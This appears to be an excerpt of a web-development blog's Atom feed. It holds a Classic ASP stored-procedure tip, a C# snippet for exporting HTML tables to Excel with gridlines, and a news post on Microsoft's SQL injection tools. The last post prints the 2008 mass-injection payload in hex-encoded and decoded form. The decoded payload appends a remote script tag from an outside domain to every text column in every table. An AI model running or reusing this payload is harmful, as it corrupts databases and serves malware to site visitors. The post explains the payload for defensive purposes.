<span class="kw2">var</span> oCmd <span class="sy0">=</span> <span class="kw1">Server</span>.<span class="kw3">CreateObject</span><span class="br0">&#40;</span><span class="st0">&quot;ADODB.Command&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="me1">ActiveConnection</span> <span class="sy0">=</span> oConn<span class="sy0">;</span>
oCmd.<span class="me1">CommandType</span> <span class="sy0">=</span> adCmdStoredProc<span class="sy0">;</span>
oCmd.<span class="me1">CommandText</span> <span class="sy0">=</span> <span class="st0">&quot;TestProcedure2&quot;</span><span class="sy0">;</span>
oCmd.<span class="me1">Parameters</span>.<span class="me1">Append</span><span class="br0">&#40;</span>oCmd.<span class="me1">CreateParameter</span><span class="br0">&#40;</span><span class="st0">&quot;@returnValue&quot;</span>, adInteger, adParamReturnValue<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw2">var</span> oRS <span class="sy0">=</span> oCmd.<span class="kw3">Execute</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">Response</span>.<span class="kw3">Write</span><span class="br0">&#40;</span><span class="st0">&quot;return value: &quot;</span> + oCmd.<span class="me1">Parameters</span><span class="br0">&#40;</span><span class="st0">&quot;@returnValue&quot;</span><span class="br0">&#41;</span>.<span class="me1">value</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oConn.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">var oConn = Server.CreateObject("ADODB.Connection");
oConn.Open("Provider=SQLOLEDB; Data Source=ServerName; User Id=ID; Password=PASSWORD");
var oCmd = Server.CreateObject("ADODB.Command");
oCmd.ActiveConnection = oConn;
oCmd.CommandType = adCmdStoredProc;
oCmd.CommandText = "TestProcedure2";
oCmd.Parameters.Append(oCmd.CreateParameter("@returnValue", adInteger, adParamReturnValue));
var oRS = oCmd.Execute();
Response.Write("return value: " + oCmd.Parameters("@returnValue").value);
oCmd.Close();
oConn.Close();</pre></div></div>

<p>One thing that may seem even more odd is that if you do not assign the recordset returned by the procedure to a variable (oRS in the example above), then the returnValue parameter contains the correct value.</p>
<p>The reason for this is that the recordset returned by the stored procedure must be closed before you can access the returnValue parameter.  I find using the GetRows() method to be extremely handy for this as it allows you to pull all the recordset information into an ASP array and close the recordset immediately afterward, giving you access to both the recordset information and the return value at the same time.</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="asp"><thead><tr><td colspan="2"  class="head">ASP</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="de1"><pre class="de1"><span class="kw2">var</span> oConn <span class="sy0">=</span> <span class="kw1">Server</span>.<span class="kw3">CreateObject</span><span class="br0">&#40;</span><span class="st0">&quot;ADODB.Connection&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oConn.<span class="kw3">Open</span><span class="br0">&#40;</span><span class="st0">&quot;Provider=SQLOLEDB; Data Source=ServerName; User Id=ID; Password=PASSWORD&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw2">var</span> oCmd <span class="sy0">=</span> <span class="kw1">Server</span>.<span class="kw3">CreateObject</span><span class="br0">&#40;</span><span class="st0">&quot;ADODB.Command&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="me1">ActiveConnection</span> <span class="sy0">=</span> oConn<span class="sy0">;</span>
oCmd.<span class="me1">CommandType</span> <span class="sy0">=</span> adCmdStoredProc<span class="sy0">;</span>
oCmd.<span class="me1">CommandText</span> <span class="sy0">=</span> <span class="st0">&quot;TestProcedure2&quot;</span><span class="sy0">;</span>
oCmd.<span class="me1">Parameters</span>.<span class="me1">Append</span><span class="br0">&#40;</span>oCmd.<span class="me1">CreateParameter</span><span class="br0">&#40;</span><span class="st0">&quot;@returnValue&quot;</span>, adInteger, adParamReturnValue<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw2">var</span> oRS <span class="sy0">=</span> oCmd.<span class="kw3">Execute</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">&#40;</span>oRS.<span class="me1">RecordCount</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
&nbsp; &nbsp;<span class="kw2">var</span> recordSetData <span class="sy0">=</span> oRS.<span class="me1">GetRows</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
oRS.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
<span class="kw1">Response</span>.<span class="kw3">Write</span><span class="br0">&#40;</span><span class="st0">&quot;return value: &quot;</span> + oCmd.<span class="me1">Parameters</span><span class="br0">&#40;</span><span class="st0">&quot;@returnValue&quot;</span><span class="br0">&#41;</span>.<span class="me1">value</span><span class="br0">&#41;</span><span class="sy0">;</span>
oCmd.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
oConn.<span class="kw3">Close</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">var oConn = Server.CreateObject("ADODB.Connection");
oConn.Open("Provider=SQLOLEDB; Data Source=ServerName; User Id=ID; Password=PASSWORD");
var oCmd = Server.CreateObject("ADODB.Command");
oCmd.ActiveConnection = oConn;
oCmd.CommandType = adCmdStoredProc;
oCmd.CommandText = "TestProcedure2";
oCmd.Parameters.Append(oCmd.CreateParameter("@returnValue", adInteger, adParamReturnValue));
var oRS = oCmd.Execute();
if (oRS.RecordCount) {
   var recordSetData = oRS.GetRows();
}
oRS.Close()
Response.Write("return value: " + oCmd.Parameters("@returnValue").value);
oCmd.Close();
oConn.Close();</pre></div></div>

]]></content>
			<link rel="replies" type="text/html" href="/index.php/webdev/serverprogramming/classicasp/using-asp-to-retrieve-a-recordset-and-re/#comments" thr:count="4"/>
		<link rel="replies" type="application/atom+xml" href="/index.php/webdev/serverprogramming/classicasp/using-asp-to-retrieve-a-recordset-and-re/feed/atom/" thr:count="4"/>
		<thr:total>4</thr:total>
		</entry>
		<entry>
		<author>
			<name>kaht</name>
					</author>
		<title type="html"><![CDATA[Export HTML table to Excel with grid lines]]></title>
		<link rel="alternate" type="text/html" href="/index.php/webdev/serverprogramming/aspnet/export-table-to-excel-with-grid-lines/" />
		<id>/index.php/2009/06/export-table-to-excel-with-grid-lines/</id>
		<updated>2009-06-25T17:47:45Z</updated>
		<published>2009-06-25T17:47:45Z</published>
		<category scheme="/" term="ASP.NET" /><category scheme="/" term="Classic ASP" /><category scheme="/" term="asp" /><category scheme="/" term="asp.net" /><category scheme="/" term="excel" />		<summary type="html"><![CDATA[A programmatic example of how to export an HTML file to excel while keeping grid lines visible.  This solution does not require the use of a COM object.]]></summary>
		<content type="html" xml:base="/index.php/webdev/serverprogramming/aspnet/export-table-to-excel-with-grid-lines/"><![CDATA[<p>For a long time I have had to make web reports for our company that could be exported to excel. This is a fairly easy process. All you have to do is put your report in an HTML table and add the following 2 lines of code:</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="csharp"><thead><tr><td colspan="2"  class="head">C#</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
</pre></td><td class="de1"><pre class="de1">Response<span class="sy0">.</span><span class="me1">ContentType</span> <span class="sy0">=</span> <span class="st0">&quot;application/ms-excel&quot;</span><span class="sy0">;</span>
Response<span class="sy0">.</span><span class="me1">AddHeader</span><span class="br0">&#40;</span><span class="st0">&quot;content-disposition&quot;</span>, <span class="st0">&quot;attachment; filename=test.xls&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">Response.ContentType = "application/ms-excel";
Response.AddHeader("content-disposition", "attachment; filename=test.xls");</pre></div></div>

<p>However, when the excel file is generated it has a nasty side effect of having all the gridlines hidden. They can easily be turned back on in excel by the following: Tools > Options > click gridlines checkbox.</p>
<p>Until today I put up with the gridlines being hidden. When I tried to search for a solution via google, most people suggested that it just wasn&#8217;t possible to generate the excel report with gridlines. Other people offered solutions that required you to run a COM object on the server to start an instance of excel in the background to create the file. However, after searching through a bunch of garbage and piecing together bits and pieces of non-working solutions, I finally got it to work. The trick is to set up your own custom XML settings, and add the &#8220;Panes&#8221; worksheet option. Here was the working solution:</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="csharp"><thead><tr><td colspan="2"  class="head">C#</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre></td><td class="de1"><pre class="de1"><span class="kw1">using</span> <span class="co3">System</span><span class="sy0">;</span>
<span class="kw1">using</span> <span class="co3">System.Data</span><span class="sy0">;</span>
<span class="kw1">using</span> <span class="co3">System.Configuration</span><span class="sy0">;</span>
<span class="kw1">using</span> <span class="co3">System.Collections</span><span class="sy0">;</span>
<span class="kw1">using</span> <span class="co3">System.Web</span><span class="sy0">;</span>
<span class="kw1">using</span> <span class="co3">System.Web.Security</span><span class="sy0">;</span>
<span class="kw1">using</span> <span class="co3">System.Web.UI</span><span class="sy0">;</span>
<span class="kw1">using</span> <span class="co3">System.Web.UI.WebControls</span><span class="sy0">;</span>
<span class="kw1">using</span> <span class="co3">System.Web.UI.WebControls.WebParts</span><span class="sy0">;</span>
<span class="kw1">using</span> <span class="co3">System.Web.UI.HtmlControls</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">namespace</span> excelGridlineTest
<span class="br0">&#123;</span>
&nbsp; &nbsp;<span class="kw1">public</span> <span class="kw1">partial</span> <span class="kw4">class</span> _Default <span class="sy0">:</span> <span class="kw5">System.<span class="me1">Web</span><span class="sy0">.</span><span class="me1">UI</span></span><span class="sy0">.</span><span class="me1">Page</span>
&nbsp; &nbsp;<span class="br0">&#123;</span>
&nbsp; &nbsp; &nbsp; <span class="kw1">protected</span> <span class="kw4">void</span> Page_Load<span class="br0">&#40;</span><span class="kw4">object</span> sender, EventArgs e<span class="br0">&#41;</span>
&nbsp; &nbsp; &nbsp; <span class="br0">&#123;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">ContentType</span> <span class="sy0">=</span> <span class="st0">&quot;application/ms-excel&quot;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">AddHeader</span><span class="br0">&#40;</span><span class="st0">&quot;content-disposition&quot;</span>, <span class="st0">&quot;attachment; filename=test.xls&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;html xmlns:x=&quot;</span>urn<span class="sy0">:</span>schemas<span class="sy0">-</span>microsoft<span class="sy0">-</span>com<span class="sy0">:</span>office<span class="sy0">:</span>excel<span class="st0">&quot;&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;head&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;meta http-equiv=&quot;</span>Content<span class="sy0">-</span>Type<span class="st0">&quot; content=&quot;</span>text<span class="sy0">/</span>html<span class="sy0">;</span>charset<span class="sy0">=</span>windows<span class="sy0">-</span><span class="nu0">1252</span><span class="st0">&quot;&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;!--[if gte mso 9]&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;xml&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;x:ExcelWorkbook&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;x:ExcelWorksheets&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;x:ExcelWorksheet&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="co1">//this line names the worksheet</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;x:Name&gt;gridlineTest&lt;/x:Name&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;x:WorksheetOptions&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="co1">//these 2 lines are what works the magic</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;x:Panes&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/x:Panes&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/x:WorksheetOptions&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/x:ExcelWorksheet&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/x:ExcelWorksheets&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/x:ExcelWorkbook&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/xml&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;![endif]--&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/head&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;body&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;table&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;tr&gt;&lt;td&gt;ID&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Balance&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;tr&gt;&lt;td&gt;1234&lt;/td&gt;&lt;td&gt;Al Bundy&lt;/td&gt;&lt;td&gt;45&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;tr&gt;&lt;td&gt;9876&lt;/td&gt;&lt;td&gt;Homer Simpson&lt;/td&gt;&lt;td&gt;-129&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;tr&gt;&lt;td&gt;5555&lt;/td&gt;&lt;td&gt;Peter Griffin&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/table&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/body&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Response<span class="sy0">.</span><span class="me1">Write</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/html&gt;&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp; &nbsp; &nbsp; <span class="br0">&#125;</span>
&nbsp; &nbsp;<span class="br0">&#125;</span>
<span class="br0">&#125;</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
 
namespace excelGridlineTest
{
   public partial class _Default : System.Web.UI.Page
   {
      protected void Page_Load(object sender, EventArgs e)
      {
         Response.ContentType = "application/ms-excel";
         Response.AddHeader("content-disposition", "attachment; filename=test.xls");
         Response.Write("&lt;html xmlns:x="urn:schemas-microsoft-com:office:excel"&gt;");
         Response.Write("&lt;head&gt;");
         Response.Write("&lt;meta http-equiv="Content-Type" content="text/html;charset=windows-1252"&gt;");
         Response.Write("&lt;!--[if gte mso 9]&gt;");
         Response.Write("&lt;xml&gt;");
         Response.Write("&lt;x:ExcelWorkbook&gt;");
         Response.Write("&lt;x:ExcelWorksheets&gt;");
         Response.Write("&lt;x:ExcelWorksheet&gt;");
         //this line names the worksheet
         Response.Write("&lt;x:Name&gt;gridlineTest&lt;/x:Name&gt;");
         Response.Write("&lt;x:WorksheetOptions&gt;");
         //these 2 lines are what works the magic
         Response.Write("&lt;x:Panes&gt;");
         Response.Write("&lt;/x:Panes&gt;");
         Response.Write("&lt;/x:WorksheetOptions&gt;");
         Response.Write("&lt;/x:ExcelWorksheet&gt;");
         Response.Write("&lt;/x:ExcelWorksheets&gt;");
         Response.Write("&lt;/x:ExcelWorkbook&gt;");
         Response.Write("&lt;/xml&gt;");
         Response.Write("&lt;![endif]--&gt;");
         Response.Write("&lt;/head&gt;");
         Response.Write("&lt;body&gt;");
         Response.Write("&lt;table&gt;");
         Response.Write("&lt;tr&gt;&lt;td&gt;ID&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Balance&lt;/td&gt;&lt;/tr&gt;");
         Response.Write("&lt;tr&gt;&lt;td&gt;1234&lt;/td&gt;&lt;td&gt;Al Bundy&lt;/td&gt;&lt;td&gt;45&lt;/td&gt;&lt;/tr&gt;");
         Response.Write("&lt;tr&gt;&lt;td&gt;9876&lt;/td&gt;&lt;td&gt;Homer Simpson&lt;/td&gt;&lt;td&gt;-129&lt;/td&gt;&lt;/tr&gt;");
         Response.Write("&lt;tr&gt;&lt;td&gt;5555&lt;/td&gt;&lt;td&gt;Peter Griffin&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;");
         Response.Write("&lt;/table&gt;");
         Response.Write("&lt;/body&gt;");
         Response.Write("&lt;/html&gt;");
      }
   }
}</pre></div></div>

<p>Got a web related question?  Discuss it in the forums: http://forum.lessthandot.com/</p>
]]></content>
			<link rel="replies" type="text/html" href="/index.php/webdev/serverprogramming/aspnet/export-table-to-excel-with-grid-lines/#comments" thr:count="22"/>
		<link rel="replies" type="application/atom+xml" href="/index.php/webdev/serverprogramming/aspnet/export-table-to-excel-with-grid-lines/feed/atom/" thr:count="22"/>
		<thr:total>22</thr:total>
		</entry>
		<entry>
		<author>
			<name>SQLDenis</name>
					</author>
		<title type="html"><![CDATA[Microsoft Has Released Tools To Address SQL Injection Attacks]]></title>
		<link rel="alternate" type="text/html" href="/index.php/webdev/webdesigngraphicsstyling/microsoft-has-released-tools-to-address/" />
		<id>/index.php/2008/06/microsoft-has-released-tools-to-address/</id>
		<updated>2008-06-25T11:37:29Z</updated>
		<published>2008-06-25T11:37:29Z</published>
		<category scheme="/" term="Classic ASP" /><category scheme="/" term="Microsoft IIS" /><category scheme="/" term="Web Design, Graphics and Styling" />		<summary type="html"><![CDATA[Microsoft has released 3 tools that deal with the recent SQL injection attack. These three tools include HP Scrawlr , UrlScan version 3.0 Beta , and a SQL Source Code Analysis Tool. Microsoft further recommends following the best practices found within security advisory 954462. Most of the sites affected had this submitted as part of [&#8230;]]]></summary>
		<content type="html" xml:base="/index.php/webdev/webdesigngraphicsstyling/microsoft-has-released-tools-to-address/"><![CDATA[<p>Microsoft has released 3 tools that deal with the recent SQL injection attack.<br />
These three tools include <a href="http://www.communities.hp.com/securitysoftware/blogs/spilabs/archive/2008/06/23/finding-sql-injection-with-scrawlr.aspx">HP Scrawlr</a> , <a href="http://learn.iis.net/page.aspx/473/using-urlscan">UrlScan</a> version 3.0 Beta , and a <a href="http://support.microsoft.com/kb/954476">SQL Source Code Analysis Tool</a>. Microsoft further recommends following the best practices found within security advisory <a href="http://www.microsoft.com/technet/security/advisory/954462.mspx">954462</a>. </p>
<p>Most of the sites affected had this submitted as part of the injection  </p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="sql"><thead><tr><td colspan="2"  class="head">SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
</pre></td><td class="de1"><pre class="de1">DECLARE%20@S%20VARCHAR<span class="br0">&#40;</span><span class="nu0">4000</span><span class="br0">&#41;</span>;SET%20@S<span class="sy0">=</span><span class="kw1">CAST</span><span class="br0">&#40;</span>0x4445434C415 245204054205641524348415228323535292C40432056415243
span class="br0">&#40;</span><span class="nu0">4000</span><span class="br0">&#41;</span><span class="br0">&#41;</span>;<span class="kw1">EXEC</span><span class="br0">&#40;</span>@S<span class="br0">&#41;</span>;</pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">DECLARE%20@S%20VARCHAR(4000);SET%20@S=CAST(0x4445434C415 245204054205641524348415228323535292C40432056415243
pre></div></div>

<p>This is of course done so that you can&#8217;t see the real SQL and then you can&#8217;t check for DROP, UPDATE and other DDL and DML commands </p>
<p>So what does this look like when you replace %20 with a space and exec with print?</p>
<pre>DECLARE Table_Cursor 
CURSOR FOR SELECT a.name,b.name FROM sysobjects a,syscolumns b 
WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) OPEN Table_Cursor 
FETCH NEXT FROM Table_Cursor INTO @T,@C 
WHILE(@@FETCH_STATUS=0) 
BEGIN 
EXEC('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''&lt;script src=http://www.chkbnr.com/b.js&gt;&lt;/script&gt;''')
 FETCH NEXT FROM Table_Cursor INTO @T,@C 
END CLOSE Table_Cursor DEALLOCATE Table_Cursor  </pre>
<p>Somehow I think this could have been written set based  <img src="https://s.w.org/images/core/emoji/2/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p>The problem is of course that you should never ever run as dbo or even worse sa.</p>
]]></content>
			<link rel="replies" type="text/html" href="/index.php/webdev/webdesigngraphicsstyling/microsoft-has-released-tools-to-address/#comments" thr:count="1"/>
		<link rel="replies" type="application/atom+xml" href="/index.php/webdev/webdesigngraphicsstyling/microsoft-has-released-tools-to-address/feed/atom/" thr:count="1"/>
		<thr:total>1</thr:total>
		</entry>
	</feed>
